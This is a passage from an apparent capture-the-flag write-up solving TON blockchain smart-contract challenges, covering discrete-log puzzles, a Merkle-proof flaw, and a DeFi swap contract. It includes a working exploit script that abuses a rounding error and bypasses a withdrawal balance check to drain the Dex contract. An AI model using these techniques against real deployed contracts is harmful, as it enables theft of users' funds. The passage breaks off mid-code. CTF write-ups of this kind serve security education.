<span class=n>E</span> <span class=o>=</span> <span class=n>EllipticCurve</span><span class=p>(</span><span class=n>F</span><span class=p>,</span> <span class=p>[</span><span class=mi>1</span><span class=p>,</span> <span class=mi>3</span><span class=p>])</span>
<span class=n>p1</span> <span class=o>=</span> <span class=n>E</span><span class=p>(</span><span class=mi>627636259244800403</span><span class=p>,</span> <span class=mi>317346088871876181</span><span class=p>)</span>
<span class=n>p2</span> <span class=o>=</span> <span class=n>E</span><span class=p>(</span><span class=mi>456557409365020317</span><span class=p>,</span> <span class=mi>354112687690635257</span><span class=p>)</span>
<span class=nb>print</span><span class=p>(</span><span class=n>p1</span><span class=o>.</span><span class=n>discrete_log</span><span class=p>(</span><span class=n>p2</span><span class=p>))</span>
</code></pre></td></tr></table></div></div><p>Running this script gave the solution <code>844279</code>.</p><p>Once Sage provided the solution, I simply had to send the following cell to solve the challenge:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=n>begin_cell</span><span class=p>()</span><span class=o>.</span><span class=n>store_uint</span><span class=p>(</span><span class=mh>0x868dd340</span><span class=p>,</span> <span class=mi>32</span><span class=p>)</span><span class=o>.</span><span class=n>store_uint</span><span class=p>(</span><span class=mi>844279</span><span class=p>,</span> <span class=mi>257</span><span class=p>)</span><span class=o>.</span><span class=n>end_cell</span><span class=p>()</span>
</code></pre></td></tr></table></div></div><h2 id=dex>Dex</h2><div class="details admonition note open"><div class="details-summary admonition-title"><i class="icon fas fa-pencil-alt fa-fw" aria-hidden=true></i>Challenge Info<i class="details-icon fas fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><ul><li>Source: <a href=https://github.com/TonBitSec/TonCTF-Challenges/tree/main/dex>https://github.com/TonBitSec/TonCTF-Challenges/tree/main/dex</a></li><li>Score: 200</li></ul></div></div></div><p>Unlike the previous mathematical challenge <strong>Eccs</strong>, the <strong>Dex</strong> challenge was much more engaging, combining a common issue in DeFi—<strong>rounding errors</strong>—with some unique features of the TON blockchain.</p><h3 id=the-vulnerability-2>The Vulnerability</h3><p>If you&rsquo;re familiar with auditing or securing DeFi projects, you might have quickly spotted the vulnerability in the swap implementation. The contract incorrectly rounded the <code>out_amount</code> up during a swap, which allowed users to exploit the rounding error for profit.</p><p>However, simply exploiting the rounding error wasn’t enough to solve the challenge. After taking advantage of the bug, the contract would only set the <code>lock</code> variable to <code>True</code>. To fully solve the challenge, a second condition needed to be met: the TON balance of the contract’s account had to drop below <strong>0.5 TON</strong>.</p><p>Since the contract required a minimum of 0.14 TON for each operation, it was clear that performing just three swaps wouldn&rsquo;t be enough to fully deplete the balance. This meant I had to trigger a withdrawal to reduce the contract&rsquo;s balance further.</p><h3 id=bypassing-the-withdrawal-check>Bypassing the Withdrawal Check</h3><p>In the contract’s <code>withdraw</code> function, there was a balance check that required:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-ts data-lang=ts><span class=kr>require</span><span class=p>(</span><span class=nx>myBalance</span><span class=p>()</span> <span class=o>&gt;</span> <span class=nx>ton</span><span class=p>(</span><span class=s2>&#34;1.0&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=nx>self</span><span class=p>.</span><span class=nx>storageReserve</span> <span class=o>+</span> <span class=nx>msg</span><span class=p>.</span><span class=nx>value</span><span class=p>,</span> <span class=s2>&#34;Insufficient balance&#34;</span><span class=p>);</span>
</code></pre></td></tr></table></div></div><p>This check ensured that the balance of the contract, minus the amount the user wanted to withdraw, had to exceed <strong>1 TON</strong> plus the <strong>storage reserve</strong> (0.1 TON).</p><p>At first glance, this seemed like a limitation that would prevent us from depleting the contract&rsquo;s balance below 0.5 TON. However, there was a clever workaround. When calling the <code>withdraw</code> function, if I attached a sufficiently large amount of TON, this amount would temporarily increase the <code>myBalance()</code> that the contract checked against.</p><p>Since the actual withdrawal used the <strong>SendRemainingValue</strong> mode, the contract would return any excess TON back to me, bypassing the balance check while still allowing me to withdraw funds.</p><h3 id=the-exploit-1>The Exploit</h3><p>Here’s the code I used to perform the exploit:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=k>await</span> <span class=n>wallet</span><span class=o>.</span><span class=n>transfer</span><span class=p>(</span><span class=n>CONTRACT</span><span class=p>,</span> <span class=n>amount</span><span class=o>=</span><span class=mf>0.15</span><span class=p>,</span> <span class=n>body</span><span class=o>=</span><span class=s1>&#39;CreateUser&#39;</span><span class=p>)</span>
<span class=nb>print</span><span class=p>(</span><span class=k>await</span> <span class=n>client</span><span class=o>.</span><span class=n>get_last_transaction</span><span class=p>(</span><span class=n>CONTRACT</span><span class=p>))</span>

<span class=k>async</span> <span class=k>def</span> <span class=nf>swap_1</span><span class=p>(</span><span class=n>amount</span><span class=p>):</span>
    <span class=n>builder</span> <span class=o>=</span> <span class=n>begin_cell</span><span class=p>()</span><span class=o>.</span><span class=n>store_uint</span><span class=p>(</span><span class=mh>0x40e869ea</span><span class=p>,</span> <span class=mi>32</span><span class=p>)</span><span class=o>.</span><span class=n>store_coins</span><span class=p>(</span><span class=n>amount</span><span class=p>)</span><span class=o>.</span><span class=n>store_uint</span><span class=p>(</span><span class=mh>0x1</span><span class=p>,</span> <span class=mi>257</span><span class=p>)</span>
    <span class=n>cell</span> <span class=o>=</span> <span class=n>builder</span><span class=o>.</span><span class=n>end_cell</span><span class=p>()</span>
    <span class=k>await</span> <span class=n>wallet</span><span class=o>.</span><span class=n>transfer</span><span class=p>(</span><span class=n>CONTRACT</span><span class=p>,</span> <span class=n>amount</span><span class=o>=</span><span class=mf>0.15</span><span class=p>,</span> <span class=n>body</span><span class=o>=</span><span class=n>cell</span><span class=p>)</span>
    <span class=nb>print</span><span class=p>(</span><span class=k>await</span> <span class=n>client</span><span class=o>.</span><span class=n>get_last_transaction</span><span class=p>(</span><span class=n>CONTRACT</span><span class=p>))</span>

<span class=k>async</span> <span class=k>def</span> <span class=nf>swap_2</span><span class=p>(</span><span class=n>amount</span><span class=p>):</span>
    <span class=n>builder</span> <span class=o>=</span> <span class=n>begin_cell</span><span class=p>()</span><span class=o>.</span><span class=n>store_uint</span><span class=p>(</span><span class=mh>0x40e869ea</span><span class=p>,</span> <span class=mi>32</span><span class=p>)</span><span class=o>.</span><span class=n>store_coins</span><span class=p>(</span><span class=n>amount</span><span class=p>)</span><span class=o>.</span><span class=n>store_uint</span><span class=p>(</span><span class=mh>0x2</span><span class=p>,</span> <span class=mi>257</span><span class=p>)</span>
    <span class=n>cell</span> <span class=o>=</span> <span class=n>builder</span><span class=o>.</span><span class=n>end_cell</span><span class=p>()</span>
    <span class=k>await</span> <span class=n>wallet</span><span class=o>.</span><span class=n>transfer</span><span class=p>(</span><span class=n>CONTRACT</span><span class=p>,</span> <span class=n>amount</span><span class=o>=</span><span class=mf>0.15</span><span class=p>,</span> <span class=n>body</span><span class=o>=</span><span class=n>cell</span><span class=p>)</span>
    <span class=nb>print</span><span class=p>(</span><span class=k>await</span> <span class=n>client</span><span class=o>.</span><span class=n>get_last_transaction</span><span class=p>(</span><span class=n>CONTRACT</span><span class=p>))</span>

<span class=c1># Perform the swaps</span>
<span class=k>await</span> <span class=n>swap_1</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
<span class=k>await</span> <span class=n>swap_2</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
<span class=k>await</span> <span class=n>swap_2</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>

<span class=k>await</span> <span class=n>swap_1</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
<span class=k>await</span> <span class=n>swap_2</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
<span class=k>await</span> <span class=n>swap_2</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>

<span class=k>await</span> <span class=n>swap_1</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
<span class=k>await</span> <span class=n>swap_2</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
<span class=k>await</span> <span class=n>swap_2</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>

<span class=k>await</span> <span class=n>swap_1</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
<span class=k>await</span> <span class=n>swap_2</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
<span class=k>await</span> <span class=n>swap_2</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>

<span class=k>await</span> <span class=n>swap_1</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
<span class=k>await</span> <span class=n>swap_2</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
<span class=k>await</span> <span class=n>swap_2</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>

<span class=k>await</span> <span class=n>swap_1</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
<span class=k>await</span> <span class=n>swap_2</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
<span class=k>await</span> <span class=n>swap_2</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
<span class=k>await</span> <span class=n>swap_2</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>

<span class=k>await</span> <span class=n>swap_1</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
<span class=k>await</span> <span class=n>swap_2</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
<span class=k>await</span> <span class=n>swap_2</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>

<span class=k>await</span> <span class=n>swap_1</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>

<span class=c1># Perform withdrawal with the required amount</span>
<span class=n>builder</span> <span class=o>=</span> <span class=n>begin_cell</span><span class=p>()</span><span class=o>.</span><span class=n>store_uint</span><span class=p>(</span><span class=mh>0xa4a52dd3</span><span class=p>,</span> <span class=mi>32</span><span class=p>)</span><span class=o>.</span><span class=n>store_coins</span><span class=p>(</span><span class=mi>5212062305</span><span class=p>)</span>
<span class=n>cell</span> <span class=o>=</span> <span class=n>builder</span><span class=o>.</span><span class=n>end_cell</span><span class=p>()</span>
<span class=k>await</span> <span class=n>wallet</span><span class=o>.</span><span class=n>transfer</span><span class=p>(</span><span class=n>CONTRACT</span><span class=p>,</span> <span class=n>amount</span><span class=o>=</span><span class=mi>2</span><span class=p>,</span> <span class=n>body</span><span class=o>=</span><span class=n>cell</span><span class=p>)</span>
<span class=nb>print</span><span class=p>(</span><span class=k>await</span> <span class=n>client</span><span class=o>.</span><span class=n>get_last_transaction</span><span class=p>(</span><span class=n>CONTRACT</span><span class=p>))</span>

<span class=c1># Call Solve method</span>
<span class=k>await</span> <span class=n>wallet</span><span class=o>.</span><span class=n>transfer</span><span class=p>(</span><span class=n>CONTRACT</span><span class=p>,</span> <span class=n>amount</span><span class=o>=</span><span class=mf>0.1</span><span class=p>,</span> <span class=n>body</span><span class=o>=</span><span class=s1>&#39;Solve&#39;</span><span class=p>)</span>
<span class=nb>print</span><span class=p>(</span><span class=k>await</span> <span class=n>client</span><span class=o>.</span><span class=n>get_last_transaction</span><span class=p>(</span><span class=n>CONTRACT</span><span class=p>))</span>

<span class=c1># Check if solved</span>
<span class=nb>print</span><span class=p>(</span><span class=k>await</span> <span class=n>client</span><span class=o>.</span><span class=n>run_get_method</span><span class=p>(</span><span class=n>CONTRACT</span><span class=p>,</span> <span class=s2>&#34;is_solved&#34;</span><span class=p>))</span>
</code></pre></td></tr></table></div></div><p><strong>Note:</strong></p><ul><li>My approach to exploiting the rounding error was far from optimal. There’s room for improvement to reduce the number of swaps.</li><li>The withdrawal amount I used in the code might need to be adjusted depending on the actual balance of the contract’s account at the time of the attack.</li></ul><h2 id=puzzle>Puzzle</h2><div class="details admonition note open"><div class="details-summary admonition-title"><i class="icon fas fa-pencil-alt fa-fw" aria-hidden=true></i>Challenge Info<i class="details-icon fas fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><ul><li>Source: <a href=https://github.com/TonBitSec/TonCTF-Challenges/tree/main/puzzle>https://github.com/TonBitSec/TonCTF-Challenges/tree/main/puzzle</a></li><li>Score: 200</li></ul></div></div></div><p>As the name suggests, the <strong>Puzzle</strong> challenge was a straightforward puzzle, but it came with a subtle trap in the contract’s code. Specifically, all the bitwise shift operations in the contract didn’t include any assignment, rendering them ineffective. Once I realized this, solving the challenge became much simpler.</p><p>Ignoring the ineffective shift operations, the order of the operations wasn’t particularly important. The goal was to figure out how each operation affected the sum of the six member variables. After observing how each operation changed the sum, I could either manually adjust the values to meet the required conditions or use a solver like <strong>Z3</strong> to automate the process.</p><h2 id=curve>Curve</h2><div class="details admonition note open"><div class="details-summary admonition-title"><i class="icon fas fa-pencil-alt fa-fw" aria-hidden=true></i>Challenge Info<i class="details-icon fas fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><ul><li>Source: <a href=https://github.com/TonBitSec/TonCTF-Challenges/tree/main/curve>https://github.com/TonBitSec/TonCTF-Challenges/tree/main/curve</a></li><li>Score: 200</li></ul></div></div></div><p>The <strong>Curve</strong> challenge was another mathematical puzzle, unrelated to the core features of the TON ecosystem. It revolved around solving a discrete logarithm problem on a given curve, where the contract implemented curve addition and multiplication.</p><h3 id=understanding-the-curve>Understanding the Curve</h3><p>The curve&rsquo;s behavior is defined in the challenge’s contract, specifically in the section that calculates the slope (<code>m</code>) during the point addition process:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-typescript data-lang=typescript><span class=k>if</span> <span class=p>(</span><span class=nx>x1</span> <span class=o>==</span> <span class=nx>x2</span> <span class=o>&amp;&amp;</span> <span class=nx>y1</span> <span class=o>==</span> <span class=nx>y2</span><span class=p>)</span> <span class=p>{</span>
    <span class=nx>m</span> <span class=o>=</span> <span class=p>((</span><span class=nx>self</span><span class=p>.</span><span class=nx>a</span> <span class=o>*</span> <span class=p>((</span><span class=nx>x1</span> <span class=o>+</span> <span class=nx>x2</span><span class=p>)</span> <span class=o>%</span> <span class=nx>self</span><span class=p>.</span><span class=nx>p</span><span class=p>)</span> <span class=o>%</span> <span class=nx>self</span><span class=p>.</span><span class=nx>p</span><span class=p>)</span> <span class=o>+</span> <span class=nx>self</span><span class=p>.</span><span class=nx>b</span><span class=p>)</span> <span class=o>%</span> <span class=nx>self</span><span class=p>.</span><span class=nx>p</span><span class=p>;</span>
<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
    <span class=nx>m</span> <span class=o>=</span> <span class=p>(((</span><span class=nx>y2</span> <span class=o>-</span> <span class=nx>y1</span><span class=p>)</span> <span class=o>%</span> <span class=nx>self</span><span class=p>.</span><span class=nx>p</span><span class=p>)</span> <span class=o>*</span> <span class=nx>self</span><span class=p>.</span><span class=nx>invMod</span><span class=p>(</span><span class=nx>x2</span> <span class=o>-</span> <span class=nx>x1</span><span class=p>,</span> <span class=nx>self</span><span class=p>.</span><span class=nx>p</span><span class=p>))</span> <span class=o>%</span> <span class=nx>self</span><span class=p>.</span><span class=nx>p</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></td></tr></table></div></div><p>By analyzing this code, we observe that the slope calculation aligns with the properties of a quadratic curve in the form $y = ax^2 + bx + c$.</p><h3 id=curve-addition-implementation>Curve Addition Implementation</h3><p>The next part of the contract code handles the point addition on the curve:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-typescript data-lang=typescript><span class=nx>x3</span> <span class=o>=</span> <span class=p>((((</span><span class=nx>m</span> <span class=o>-</span> <span class=nx>self</span><span class=p>.</span><span class=nx>b</span><span class=p>)</span> <span class=o>*</span> <span class=nx>self</span><span class=p>.</span><span class=nx>invMod</span><span class=p>(</span><span class=nx>self</span><span class=p>.</span><span class=nx>a</span><span class=p>,</span> <span class=nx>self</span><span class=p>.</span><span class=nx>p</span><span class=p>))</span> <span class=o>%</span> <span class=nx>self</span><span class=p>.</span><span class=nx>p</span><span class=p>)</span> <span class=o>-</span> <span class=nx>self</span><span class=p>.</span><span class=nx>zero</span><span class=p>.</span><span class=nx>x</span><span class=p>)</span> <span class=o>%</span> <span class=nx>self</span><span class=p>.</span><span class=nx>p</span><span class=p>;</span>
<span class=nx>y3</span> <span class=o>=</span> <span class=p>(((</span><span class=nx>x3</span> <span class=o>-</span> <span class=nx>self</span><span class=p>.</span><span class=nx>zero</span><span class=p>.</span><span class=nx>x</span><span class=p>)</span> <span class=o>*</span> <span class=nx>m</span><span class=p>)</span> <span class=o>%</span> <span class=nx>self</span><span class=p>.</span><span class=nx>p</span> <span class=o>+</span> <span class=nx>self</span><span class=p>.</span><span class=nx>zero</span><span class=p>.</span><span class=nx>y</span><span class=p>)</span> <span class=o>%</span> <span class=nx>self</span><span class=p>.</span><span class=nx>p</span><span class=p>;</span>
<span class=k>return</span> <span class=nx>Point</span><span class=p>{</span><span class=nx>x</span>: <span class=kt>x3</span> <span class=o>%</span> <span class=nx>self</span><span class=p>.</span><span class=nx>p</span><span class=p>,</span> <span class=nx>y</span>: <span class=kt>y3</span> <span class=o>%</span> <span class=nx>self</span><span class=p>.</span><span class=nx>p</span><span class=p>};</span>
</code></pre></td></tr></table></div></div><p>Upon deeper inspection of the point addition implementation, we can see that the formula for $x_3$ simplifies to:</p><p>$$x_3 = x_1 + x_2 - x_0$$</p><p>This observation reveals that for repeated point addition (i.e., curve multiplication), the result follows the relation:</p><p>$$x_Q = k \cdot x_P - (k - 1) \cdot x_0$$ where $Q = k \cdot P$.</p><h3 id=reducing-to-a-dlp-over-mathbbf_p>Reducing to a DLP over $\mathbb{F}_p$</h3><p>Given this relationship, we can simplify the challenge to solving a discrete logarithm problem over $\mathbb{F}_p$. We are tasked with finding the multiplier <code>k</code> that satisfies:</p><p>$$k = \frac{x_2 - x_0}{x_1 - x_0} \pmod{p}$$</p><p>The solution can be found using the following Python script:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>inverse</span>

<span class=n>p</span> <span class=o>=</span> <span class=mi>1124575627794835616567</span>
<span class=n>x0</span> <span class=o>=</span> <span class=mi>26268578989036317972</span>
<span class=n>x1</span> <span class=o>=</span> <span class=mi>983810924364991907519</span>
<span class=n>x2</span> <span class=o>=</span> <span class=mi>1098402780140240490917</span>

<span class=n>k</span> <span class=o>=</span> <span class=p>(</span><span class=n>x2</span> <span class=o>-</span> <span class=n>x0</span><span class=p>)</span> <span class=o>*</span> <span class=n>inverse</span><span class=p>(</span><span class=n>x1</span> <span class=o>-</span> <span class=n>x0</span><span class=p>,</span> <span class=n>p</span><span class=p>)</span> <span class=o>%</span> <span class=n>p</span>
<span class=nb>print</span><span class=p>(</span><span class=n>k</span><span class=p>)</span>
</code></pre></td></tr></table></div></div><h2 id=ecc>Ecc</h2><div class="details admonition note open"><div class="details-summary admonition-title"><i class="icon fas fa-pencil-alt fa-fw" aria-hidden=true></i>Challenge Info<i class="details-icon fas fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><ul><li>Source: <a href=https://github.com/TonBitSec/TonCTF-Challenges/tree/main/ecc>https://github.com/TonBitSec/TonCTF-Challenges/tree/main/ecc</a></li><li>Score: 300</li></ul></div></div></div><p>Similar to the previous <strong>Curve</strong> challenge, this problem implemented curve addition and multiplication, requiring participants to solve the <strong>DLP</strong> between two points.</p><h3 id=understanding-the-curve-1>Understanding the Curve</h3><p>The curve’s slope calculation was defined in the contract as follows:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-typescript data-lang=typescript><span class=k>if</span> <span class=p>(</span><span class=nx>x1</span> <span class=o>==</span> <span class=nx>x2</span> <span class=o>&amp;&amp;</span> <span class=nx>y1</span> <span class=o>==</span> <span class=nx>y2</span><span class=p>)</span> <span class=p>{</span>
    <span class=nx>m</span> <span class=o>=</span> <span class=p>((((</span><span class=mi>3</span> <span class=o>*</span> <span class=p>((</span><span class=nx>x1</span> <span class=o>*</span> <span class=nx>x2</span><span class=p>)</span> <span class=o>%</span> <span class=nx>self</span><span class=p>.</span><span class=nx>p</span><span class=p>)</span> <span class=o>%</span> <span class=nx>self</span><span class=p>.</span><span class=nx>p</span><span class=p>)</span> <span class=o>+</span> <span class=mi>4</span> <span class=o>*</span> <span class=nx>x1</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>%</span> <span class=nx>self</span><span class=p>.</span><span class=nx>p</span><span class=p>)</span> <span class=o>*</span> <span class=p>(</span><span class=nx>self</span><span class=p>.</span><span class=nx>invMod</span><span class=p>(</span><span class=nx>y1</span> <span class=o>+</span> <span class=nx>y2</span><span class=p>,</span> <span class=nx>self</span><span class=p>.</span><span class=nx>p</span><span class=p>)</span> <span class=o>%</span> <span class=nx>self</span><span class=p>.</span><span class=nx>p</span><span class=p>))</span> <span class=o>%</span> <span class=nx>self</span><span class=p>.</span><span class=nx>p</span><span class=p>;</span>
<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
    <span class=nx>m</span> <span class=o>=</span> <span class=p>(((</span><span class=nx>y2</span> <span class=o>-</span> <span class=nx>y1</span><span class=p>)</span> <span class=o>%</span> <span class=nx>self</span><span class=p>.</span><span class=nx>p</span><span class=p>)</span> <span class=o>*</span> <span class=nx>self</span><span class=p>.</span><span class=nx>invMod</span><span class=p>(</span><span class=nx>x2</span> <span class=o>-</span> <span class=nx>x1</span><span class=p>,</span> <span class=nx>self</span><span class=p>.</span><span class=nx>p</span><span class=p>))</span> <span class=o>%</span> <span class=nx>self</span><span class=p>.</span><span class=nx>p</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></td></tr></table></div></div><p>By analyzing the slope calculation and substituting the values provided in the challenge, we deduce that the equation of the curve is:</p><p>$$ y^2 = x^3 + 2x^2 + x = x(x + 1)^2 $$</p><p>This curve is <strong>singular</strong>, which is evident because it has a node. Singular curves behave differently from regular elliptic curves, and the DLP on such curves can be reduced to solving a DLP in an isomorphic group where solving DLP is much easier.</p><h3 id=solving-the-dlp>Solving the DLP</h3><p>For this singular curve, we can calculate the two roots of the equation:</p><ol><li>The roots are <strong>0</strong> and <strong>769908256801248</strong> (which corresponds to <strong>x = -1</strong>).</li><li>For the non-zero root, <strong>α = 769908256801248</strong>, we compute the square root <strong>t = 171237201247109</strong>.</li></ol><p>With this information, we can transform the DLP on the curve into a simpler form in the isomorphic group:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=n>u</span> <span class=o>=</span> <span class=p>(</span><span class=n>Gy</span> <span class=o>+</span> <span class=n>t</span> <span class=o>*</span> <span class=p>(</span><span class=n>Gx</span> <span class=o>-</span> <span class=n>alpha</span><span class=p>))</span> <span class=o>/</span> <span class=p>(</span><span class=n>Gy</span> <span class=o>-</span> <span class=n>t</span> <span class=o>*</span> <span class=p>(</span><span class=n>Gx</span> <span class=o>-</span> <span class=n>alpha</span><span class=p>))</span>
<span class=n>v</span> <span class=o>=</span> <span class=p>(</span><span class=n>Py</span> <span class=o>+</span> <span class=n>t</span> <span class=o>*</span> <span class=p>(</span><span class=n>Px</span> <span class=o>-</span> <span class=n>alpha</span><span class=p>))</span> <span class=o>/</span> <span class=p>(</span><span class=n>Py</span> <span class=o>-</span> <span class=n>t</span> <span class=o>*</span> <span class=p>(</span><span class=n>Px</span> <span class=o>-</span> <span class=n>alpha</span><span class=p>))</span>
<span class=n>v</span><span class=o>.</span><span class=n>log</span><span class=p>(</span><span class=n>u</span><span class=p>)</span>
</code></pre></td></tr></table></div></div><h2 id=merkleairdrop>MerkleAirdrop</h2><div class="details admonition note open"><div class="details-summary admonition-title"><i class="icon fas fa-pencil-alt fa-fw" aria-hidden=true></i>Challenge Info<i class="details-icon fas fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><ul><li>Source: <a href=https://github.com/TonBitSec/TonCTF-Challenges/tree/main/merkle_airdrop>https://github.com/TonBitSec/TonCTF-Challenges/tree/main/merkle_airdrop</a></li><li>Score: 300</li></ul></div></div></div><p>The <strong>MerkleAirdrop</strong> challenge implemented an airdrop system based on a <strong>Merkle Tree</strong>. The challenge initialized a Merkle Tree and allowed a specific address—<code>EQDaypwc_Jr8by-alaK4mntRu35_EhlMz60AOeSJRawcrNM0</code>—to claim 614 tokens. The goal was to exploit the airdrop mechanism and forge a valid claim by tampering with the Merkle Tree proof.</p><h3 id=the-vulnerability-3>The Vulnerability</h3><p>Upon reviewing the <code>verify</code> function, I noticed that the way the parent nodes in the Merkle Tree were computed was unusual. Instead of concatenating and hashing the child nodes together (as is typical for Merkle Trees), the function simply calculated the <strong>difference</strong> between the two node values.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-ts data-lang=ts><span class=nx>fun</span> <span class=nx>verify</span><span class=p>(</span><span class=nx>leaf</span>: <span class=kt>Int</span><span class=p>,</span> <span class=nx>proofs</span>: <span class=kt>map</span><span class=p>&lt;</span><span class=nt>Int</span><span class=err>,</span> <span class=na>Int</span><span class=p>&gt;,</span> <span class=nx>proofLength</span>: <span class=kt>Int</span><span class=p>)</span><span class=o>:</span> <span class=nx>Bool</span> <span class=p>{</span>
    <span class=kd>let</span> <span class=nx>i</span>: <span class=kt>Int</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
    <span class=kr>require</span><span class=p>(</span><span class=nx>proofLength</span> <span class=o>+</span> <span class=mi>1</span> <span class=o>==</span> <span class=nx>self</span><span class=p>.</span><span class=nx>merkleTreeHeight</span><span class=p>,</span> <span class=s2>&#34;Invalid proof length&#34;</span><span class=p>);</span>
    <span class=k>while</span> <span class=p>(</span><span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>proofLength</span><span class=p>)</span> <span class=p>{</span>
        <span class=kd>let</span> <span class=nx>proof</span>: <span class=kt>Int?</span> <span class=o>=</span> <span class=nx>proofs</span><span class=p>.</span><span class=kr>get</span><span class=p>(</span><span class=nx>i</span><span class=p>);</span>
        <span class=k>if</span> <span class=p>(</span><span class=nx>proof</span> <span class=o>==</span> <span class=kc>null</span><span class=p>)</span> <span class=p>{</span>
            <span class=k>return</span> <span class=kc>false</span><span class=p>;</span>
        <span class=p>}</span>
        <span class=nx>leaf</span> <span class=o>=</span> <span class=nx>leaf</span> <span class=o>&gt;</span> <span class=nx>proof</span><span class=o>!!</span> <span class=o>?</span>
        <span class=nx>sha256</span><span class=p>((</span><span class=nx>leaf</span> <span class=o>-</span> <span class=nx>proof</span><span class=o>!!</span><span class=p>).</span><span class=nx>toString</span><span class=p>())</span> <span class=o>:</span>
